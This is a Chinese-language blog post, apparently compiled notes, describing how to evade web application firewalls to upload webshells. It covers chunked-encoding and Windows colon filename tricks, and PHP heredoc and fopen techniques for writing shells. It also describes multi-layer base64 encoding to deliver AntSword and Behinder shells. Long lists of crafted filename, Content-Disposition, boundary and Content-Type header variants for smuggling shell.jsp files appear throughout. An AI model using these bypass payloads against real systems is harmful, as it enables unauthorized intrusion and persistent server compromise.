+<h4 id="2、如何绕过waf"><a href="#2、如何绕过waf" class="headerlink" title="2、如何绕过waf"></a>2、如何绕过waf</h4><p>POC直接干它<br><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271530579.png" alt="img"><br>直接wait了，说明被waf拦截掉了。后面是了好多方法都不行，最后大佬说用chunked编码可以绕过，试一下<br>[<img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271528188.png" alt="img">](<a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2021/png/411367/1637486777292-17fa9048-efe4-4003-b8d2-cfb70b068634.png#clientId=u5c042590-bc39-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=ub4d514e9&amp;margin=[object">https://cdn.nlark.com/yuque/0/2021/png/411367/1637486777292-17fa9048-efe4-4003-b8d2-cfb70b068634.png#clientId=u5c042590-bc39-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=ub4d514e9&amp;margin=[object</a> Object]&amp;name&#x3D;image.png&amp;originHeight&#x3D;1827&amp;originWidth&#x3D;2623&amp;originalType&#x3D;url&amp;ratio&#x3D;1&amp;rotation&#x3D;0&amp;showTitle&#x3D;false&amp;size&#x3D;414236&amp;status&#x3D;done&amp;style&#x3D;none&amp;taskId&#x3D;uc1fd6406-a1ab-4d5f-85fd-eb6cba4f3cd&amp;title&#x3D;)<br>这也不行啊，chunked编码手还是被拦截了。大佬有说好好看看http头部的内容。<br>对比于之前的包，chunked编码后，包头中多了Transfer-Encoding:chunked，这是用来说明使用了chunked编码的，难道waf还会识别这个，自动解码chunked吗？？？既然如此那我们就不让waf识别chunked编码<br>所以在Transfer-Encoding:chunked后加入任意内容，即可绕过WAF<br><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271529180.png" alt="img"></p>
+<h2 id="一些思路文章"><a href="#一些思路文章" class="headerlink" title="一些思路文章"></a>一些思路文章</h2><h3 id="第一篇"><a href="#第一篇" class="headerlink" title="第一篇"></a>第一篇</h3><h4 id="后缀绕过"><a href="#后缀绕过" class="headerlink" title="后缀绕过"></a>后缀绕过</h4><p>首先看一下waf咋工作的，当数据包匹配到waf规则后，数据包就会被丢弃掉，就像这样</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101095357-9368b4de-3ab6-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537978.png" alt="img"></a><br>waf是拦截后缀的，首先fuzz一波<br><strong>换行</strong></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101095425-a4420c92-3ab6-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537740.png" alt="img"></a><br>失败</p>
+<p><strong>多个等于号</strong></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101095449-b276c1b8-3ab6-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537939.png" alt="img"></a><br>失败</p>
+<p><strong>单双引号替换</strong></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101095506-bc9e6cea-3ab6-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537864.png" alt="img"></a><br>失败<br><strong>去掉引号</strong></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101095547-d4fb262a-3ab6-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537868.png" alt="img"></a></p>
+<p>失败</p>
+<p><strong>溢出Content-Disposition字段</strong></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101095633-f0c81124-3ab6-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537945.png" alt="img"></a><br>失败，而且不清楚是因为服务器性能原因还是规则有这个，当此字段太长的时候（具体多长不清楚），正常上传图片数据包也会被丢弃。</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101095650-fa88607e-3ab6-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537043.png" alt="img"></a><br><strong>多个Content-Disposition字段</strong></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101095705-035907ee-3ab7-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537738.png" alt="img"></a><br>失败<br><strong>畸形协议</strong></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101095806-282a2274-3ab7-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537929.png" alt="img"></a><br>失败<br><strong>boundary前加减空格</strong></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101095829-3586dcbe-3ab7-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537999.png" alt="img"></a><br>失败，而且操作这边服务器会不识别上传，导致正常文件传不上去</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101100200-b39f9014-3ab7-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537205.png" alt="img"></a><br>删除Content-Type: image&#x2F;jpeg</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101100214-bb769a94-3ab7-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537965.png" alt="img"></a><br>失败<br><strong>溢出文件名</strong></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101100233-c6d7d9fc-3ab7-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537037.png" alt="img"></a><br>失败，而且这里也有限制，太长也会导致正常上传失效。<br><strong>Accept-Encoding：</strong><br>Accept-Encoding: gzip<br>Accept-Encoding: compress<br>Accept-Encoding: deflate<br>Accept-Encoding: br<br>Accept-Encoding: identity<br>Accept-Encoding: *<br>均失败</p>
+<p><strong>分块传输</strong></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101100327-e726f0f8-3ab7-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537169.png" alt="img"></a><br>失败 似乎waf拦截的就是 Transfer-Encoding: chunked ，但是去掉chunked会请求异常</p>
+<p>等等等后面又试了一堆，均失败<br><strong>柳暗花明</strong><br>后面看了一眼服务器 是windows的，尝试用windows文件命名规范来绕过，</p>
+<p>众所周知，win的文件名是不能包含以下字符的</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101100353-f7035246-3ab7-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537774.png" alt="img"></a><br>但是上传的时候我们可以构造，尝试使用斜杠绕过</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101100417-05558756-3ab8-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537161.png" alt="img"></a><br>结果有点出乎意料，最后到服务器的居然是.jpg,正反斜杠都这样</p>
+<p>换一个符号，尝试星号，被拦，都试了一遍后，发现只有冒号可以</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101100444-154a1adc-3ab8-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537308.png" alt="img"></a><br>访问一下看看是否存在<a target="_blank" rel="noopener" href="http://www.php/">www.php</a></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101100501-1f0e178a-3ab8-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537074.png" alt="img"></a></p>
+<p>文件确实传上去了，可是问题又来了，没写入内容…</p>
+<p>后来才知道，冒号会将文件内容置空，一时间又没了头绪</p>
+<p>姑且后缀名绕过了吧。</p>
+<h4 id="内容绕过"><a href="#内容绕过" class="headerlink" title="内容绕过"></a>内容绕过</h4><p>只传个0kb和不传不是一样吗，所以还是要把数据写进去，</p>
+<p>怎么写呢？起初我是不知道的，旁边的好兄弟说三个左尖括号可以写入文件</p>
+<p>类似这样</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101100548-3b04fa9e-3ab8-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537174.png" alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101100554-3edc7fd4-3ab8-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537970.png" alt="img"></a><br>但是 也被waf加入规则了</p>
+<p>……</p>
+<p>天无绝人之路，三个不行 我用四个</p>
+<p>没想到四个也能写 笑了 都不知道为什么</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101100612-49667f86-3ab8-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537498.png" alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101100617-4cdc574e-3ab8-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537076.png" alt="img"></a></p>
+<p>但是问题又来了 文件名咋整，<a href="http://www.php会被拦截，加个冒号又会将文件置空，似乎陷入了死循环，一顿瞎操作后，发现这样居然写进去了，虽然也不知道为什么，可能是什么奇奇怪怪的正则机制？">www.php会被拦截，加个冒号又会将文件置空，似乎陷入了死循环，一顿瞎操作后，发现这样居然写进去了，虽然也不知道为什么，可能是什么奇奇怪怪的正则机制？</a></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101100651-6090b42e-3ab8-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537489.png" alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101100703-67d061e4-3ab8-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537198.png" alt="img"></a></p>
+<p>既然能写文件了，那我本来以为就简简单单了，没想到噩梦才是刚刚开始</p>
+<p>首先我之前整的一堆花里胡哨的马一个都没过去，唯一一个能过去的，之前绕过的马还不能运行（这是个坑，后面会讲），虽然这个马在我本地是可以运行的，可能这就是玄学吧哈哈。</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101100720-71e14248-3ab8-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537045.png" alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101100755-87108fde-3ab8-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537230.png" alt="img"></a></p>
+<p>首先正常的变量他就过不去，然后&lt;?php 标签和某些场景混合时也过不去，成对的括号它也拦截，总之就是变态</p>
+<p>举个例子：</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101100827-9a4e23fe-3ab8-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537389.png" alt="img"></a><br>所以才有了上面那个奇怪的马</p>
+<p>内容绕过也是在这个基础上去过去的，本来我准备直接传这个马梭哈，但是传是传上去了，执行不了，会一直等待，但是这个等待又不是被waf拦截了，后面才知道，这是因为php内容报错了，导致不能正常运行，就会一直卡在那里，</p>
+<p>那为什么会报错呢，fuzz了一波后才发现，这个服务器上必须闭合尖括号，要不然就会直接炸，明明是同样的php版本，也不知道为什么会这样，只传递第一个标签没问题，</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101100858-acbe0bda-3ab8-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537460.png" alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101100909-b33ab3dc-3ab8-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537370.png" alt="img"></a><br>少个闭合就炸：</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101100925-bc81b59e-3ab8-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537544.png" alt="img"></a><br>但是末尾的两个标签也不能去掉，是用来混淆的，去掉直接waf都过不去</p>
+<p>场面陷入了胶着，此时将一个完整的马传上去似乎不太现实了，一步一步来吧，先尝试能不能执行命令</p>
+<p>之前讲过，规则是不允许成对括号出现的，所以连phpinfo都执行不了</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101100950-cb89c2a2-3ab8-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537997.png" alt="img"></a></p>
+<p>真的执行不了吗？</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> =&lt;&lt;&lt; <span class="string">aa</span></span><br><span class="line"><span class="string">assasssasssasssasssasssasssasssasssasssasssassss</span></span><br><span class="line"><span class="string">aa</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这种赋值手法是php的一种特性，用于解决字符串中既有单引号又有双引号这种特殊情况，aa名称没意义，起什么都可以，在某些php版本中，末尾的aa后不能加其他语句，否则会报错。</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101101029-e28047c4-3ab8-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537298.png" alt="img"></a></p>
+<p>因为会报错，所以waf不会拦截，所以在aa;后是可以添加php代码的</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101101051-eff769fa-3ab8-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537548.png" alt="img"></a><br>好巧不巧，这服务器可以执行</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101101110-fb1c64a2-3ab8-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537703.png" alt="img"></a><br>既然能执行phpinfo，那system()肯定也行</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101101136-0ada99fe-3ab9-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537714.png" alt="img"></a><br>传完后又转起来了</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101101148-11ba43c8-3ab9-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537382.png" alt="img"></a><br>这里又一个坑，因为system中可以用双引号也可以不用，用双引号的时候一般是类似 ls -l 这种有空格的情况，但是whoami这种的是不需要引号的，但是这里访问一直转明显是语法错误，那我加上就是了。</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101101207-1cfd91ae-3ab9-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537126.png" alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101101233-2c9e7c40-3ab9-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537252.png" alt="img"></a><br>属实是天坑</p>
+<p>命令执行没问题了，尝试写一句话，</p>
+<p>果不其然被拦截了</p>
+<p>尝试加点注释</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101102149-784e3f4e-3aba-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537488.png" alt="img"></a><br>没问题过去了，访问一下</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101102209-84354abe-3aba-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537394.png" alt="img"></a><br>又转起来了</p>
+<p>本地试了一下，发现eval这句不能在aa;后面，又是语法错误</p>
+<p>既然如此，那我只能放大招了，那就是fopen大法，也就是通过php脚本文件向服务器写新文件，达到绕过流量层waf检测。</p>
+<p>先写个txt试试水，所有字符能放开的最好直接用注释分开，</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101102234-92d57526-3aba-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537845.png" alt="img"></a><br>访问一下<a target="_blank" rel="noopener" href="http://www.php/">www.php</a></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101102249-9bddec02-3aba-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537709.png" alt="img"></a><br>没问题，说明确实执行了我们的代码。</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101102308-a760c2ca-3aba-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537010.png" alt="img"></a><br>那既然如此就好办多了，直接传个一句话</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101102328-b303f2be-3aba-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537481.png" alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101102339-b9c82cdc-3aba-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537227.png" alt="img"></a><br>可惜，明文传输直接挂，流量还得过。</p>
+<h4 id="流量绕过"><a href="#流量绕过" class="headerlink" title="流量绕过"></a>流量绕过</h4><p>流量绕过就比较简单了，多次编码即可，这里上传了一个三次base64解密的马</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101102414-ce7c05d6-3aba-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537685.png" alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101102430-d7d605fa-3aba-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537570.png" alt="img"></a><br>但是蚁剑编码器出现了问题，可能是多次编码导致不知道哪里出了问题，直接上传冰蝎（这里需要把冰蝎分两段传，用fopen的a参数拼接脚本）<br>over</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20211101102451-e4c06198-3aba-1.png"><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537274.png" alt="img"></a></p>
+<h3 id="第二篇"><a href="#第二篇" class="headerlink" title="第二篇"></a>第二篇</h3><h4 id="硬怼"><a href="#硬怼" class="headerlink" title="硬怼"></a>硬怼</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">硬怼的话，主要是从下面这些方法入手去操作。</span><br><span class="line">（<span class="number">1</span>）fuzz后缀名看看有无漏网之鱼（针对开发自定义的过滤可能有机会，针对waf基本不可能。更多的情况是php的站寻找文件包含或者解析漏洞乃至传配置文件一类的，但是对于这种也大可不必fuzz后缀名了）</span><br><span class="line">（<span class="number">2</span>）http头变量改造首先要明确waf的检测特征，一般是基于某种特定的情况下，去针对相应的拦截。几个例子，文件上传的时候，大多数Content-<span class="keyword">Type</span>都是application/multipart-formdata这种，<span class="type">name</span>对于waf来说，如果针对这种规则，对xxe ，<span class="keyword">sql</span>注入，上传，命令执行，内容等所有都去做一波扫描是及其浪费内存的，所以有可能针对不同的类型，做了不同的校验规则。此时通过对Content-<span class="keyword">Type</span>进行修改，可能会绕过waf。其他的http头添加删除等也是类似（<span class="number">3</span>）文件后缀构造这个和第一个有相似的就是都针对后缀名进行改造，不同的在于这里可能会利用waf的截取特征，比如回车换行绕过waf的检测，但是对于后端来说接收了所有的传入数据，导致了绕过waf。</span><br><span class="line">（<span class="number">4</span>）其他方法这种就比较杂了，但是又不属于迂回打击的一类，比如重写等方法。接下来就实战来试试</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">第一步，先来对waf的规则做一个简单的判断。这里我的习惯是从内容，后缀两个方向进行判断。简单来说，基本分为这几种情况</span><br><span class="line">（<span class="number">1</span>）只判断后缀（基本碰到的比较少了，因为很多时候白名单开发都可以完成）</span><br><span class="line">（<span class="number">2</span>）只判断内容（也比较少，因为一般的waf都会带后缀的判断）</span><br><span class="line">（<span class="number">3</span>）内容后缀同时判断（这种情况比较多，相对于来说会安全一点）</span><br><span class="line">（<span class="number">4</span>）根据文件后缀来判断内容是否需要检测（较多）</span><br><span class="line">（<span class="number">5</span>）根据Content-<span class="keyword">Type</span>来判断文件内容是否需要检测</span><br><span class="line">暂时只想到这么多，以后碰到了再单独记吧。有了思路，那么接下来就好说了。举个例子我这里的情况</span><br><span class="line">（<span class="number">1</span>）传脚本后缀（被拦截，判断了后缀）</span><br><span class="line">（<span class="number">2</span>）传脚本后缀加不免杀代码（被拦截，可能后缀内容同时拦截）</span><br><span class="line">（<span class="number">3</span>）传非脚本名（可自己fuzz一个能过waf的任意后缀，里面加恶意内容，被拦截。也就是说同时会对内容和后缀进行判断）说说我这里的情况，会对内容和后缀进行拦截。检测到上传jsp文件，任意内容都会被拦截。</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">先来fuzz一波能利用的后缀名，这里可以包括中间件的一些配置文件。希望不大，一点都不出意外，全部被拦截了。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271539345.png" alt="图片"></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">既然我们需要对后缀名进行改造，就对后缀名后面加特殊符号做一个fuzz试试，测试了一下，在没有恶意内容的情况下，只有&#x27;被过滤了。所以如果有机会，我们看看能不能试试系统特殊，比如<span class="comment">;去做截断。先记下来。因为最终还是需要免杀马的，jsp免杀又不会，先不考虑这个，先考虑把waf绕过。（这里我对filename做了换行，然后去掉了引号，加了一个;做截断绕过了waf，但是内容被查杀了，尴尬。）</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271539349.png" alt="图片"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271539615.png" alt="图片"></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">接下来对http头部进行改造一下尝试绕过</span><br><span class="line">一.filename改造</span><br><span class="line">（2） 名字特殊符号替换以及构造异常闭合（符号方法很多自己天马星空，我这里就写几个就行了，但是要注意你改造了得让后端识别到，乱改造识别不到等于白搭）</span><br><span class="line"><span class="attribute">filename</span>=<span class="string">&#x27;shell.jspx.jsp&#x27;</span></span><br><span class="line"><span class="attribute">filename</span>=`shell.jspx.jsp`</span><br><span class="line"><span class="attribute">filename</span>=shell.jspx.jsp&#x27;</span><br><span class="line"><span class="string">&quot;filename&quot;</span>=shell.jspx;</span><br><span class="line">（3）重写<span class="attribute">filename</span>=shell.jpg;filename=shell.jspx;</span><br><span class="line"><span class="attribute">filename</span>=shell.jspx;filename=shell.jpg;</span><br><span class="line">（4）大小写变化<span class="attribute">FileName</span>=shell.jspx.jsp&#x27;</span><br><span class="line">（5）参数污染</span><br><span class="line"><span class="attribute">FileName</span>=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaashell.jspx.jsp&#x27;</span><br><span class="line">FileName =shell.jspx（加空格）</span><br><span class="line"><span class="attribute">filename</span>====&quot;shell.jspx.jsp1&quot;（加等号） </span><br><span class="line">FileName =shell.jspx（前后加空格，中间也可以加特殊符号fuzz）</span><br><span class="line">（6）文件名字编码（filename一般为后端接收参数，编码了可能识别不到，这个就看情况） <span class="attribute">filename</span>=\u0073\u0068\u0065\u006c\u006c\u002e\u006a\u0073\u0070 </span><br><span class="line">（7）回车换行（有时候确实挺好用的，任意位置都可以试一下） </span><br><span class="line">1.<span class="attribute">FileName</span>=shell.jspx. </span><br><span class="line">jsp </span><br><span class="line">2.File</span><br><span class="line"><span class="attribute">Name</span>=shell.jspx.jsp&#x27; </span><br><span class="line">二 name改造 </span><br><span class="line">name也可以任意改造，改造的方法和filename差不多，就不重复发了，主要是思路重要。 其他的比如奇奇怪怪的正则需要用到的特殊字符都可以在文件名中fuzz一下，看看能否打断waf规则，也就是把我们fuzz后缀的再跑一次，或者再找点其他的正则字母，这里就不重复写了。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271539205.png" alt="图片"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271539538.png" alt="图片"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271539480.png" alt="图片"></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">http头部上传相关绕过，有一些用畸形相关的，不太推荐一来就试，fuzz的可以带一下，这种属于天时地利人和占据才用，毕竟底层的规定好的合规变了就不能识别，但是也说不准fuzz出问题了呢。fuzz本来就是一个天马行空的过程，好了，继续来看。</span><br><span class="line">（1）Content-Disposition</span><br><span class="line">溢出绕过Content-Disposition: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa form-data; <span class="attribute">name</span>=<span class="string">&quot;file&quot;</span>; <span class="attribute">filename</span>=shell.jpg;filename=shell.jspx;</span><br><span class="line">回车换行绕过（注意不要把固定字段打散了，）Content-Disposition: </span><br><span class="line">form-data; <span class="attribute">name</span>=<span class="string">&quot;file&quot;</span>; <span class="attribute">filename</span>=shell.jpg;filename=shell.jspx;</span><br><span class="line">双写绕过（写两次）Content-Disposition: form-data; <span class="attribute">name</span>=<span class="string">&quot;file&quot;</span>; <span class="attribute">filename</span>=shell.jpg;filename=shell.jspx;Content-Disposition: form-data; <span class="attribute">name</span>=<span class="string">&quot;file&quot;</span>; <span class="attribute">filename</span>=shell.jpg;filename=shell.jspx.jpg;</span><br><span class="line">还有一些参数污染加减空格啥的，和上面filename类似，就不重复写了。</span><br><span class="line">（2）boundary加减空格或者前面加恶意的参数</span><br><span class="line">boundary =---------------------------8472011224916008542288311250</span><br><span class="line">&amp;boundary =---------------------------8472011224916008542288311250</span><br><span class="line">123&amp; boundary =---------------------------8472011224916008542288311250</span><br><span class="line">多个污染（他是用来分割的，他变了下面的也要变一下）</span><br><span class="line">boundary =---------------------------8472011224916008542288311251</span><br><span class="line">boundary =---------------------------8472011224916008542288311252</span><br><span class="line">回车换行污染</span><br><span class="line">分割污染（简单来说就是他自定义了一些分割部分，我们可以把我们的恶意参数提交到其他的分割部分）见下图第一个，视情况而定。其他的常用方式和上面都可以重复的</span><br><span class="line">（3）Content-Type</span><br><span class="line">直接删除</span><br><span class="line">修改类型为application/text或者 image/jpeg等等</span><br><span class="line">回车换行</span><br><span class="line">溢出参数</span><br><span class="line">污染重复</span><br><span class="line">传入Content-Type</span><br><span class="line">大小写变换</span><br><span class="line">设置charset</span><br><span class="line">Content-Type: multipart/form-data;<span class="attribute">charset</span>=iso-8859-13</span><br><span class="line">列举几个</span><br><span class="line">ibm869</span><br><span class="line">ibm870</span><br><span class="line">ibm871</span><br><span class="line">ibm918</span><br><span class="line">iso-2022-cn</span><br><span class="line">iso-2022-jp</span><br><span class="line">iso-2022-jp-2</span><br><span class="line">iso-2022-kr</span><br><span 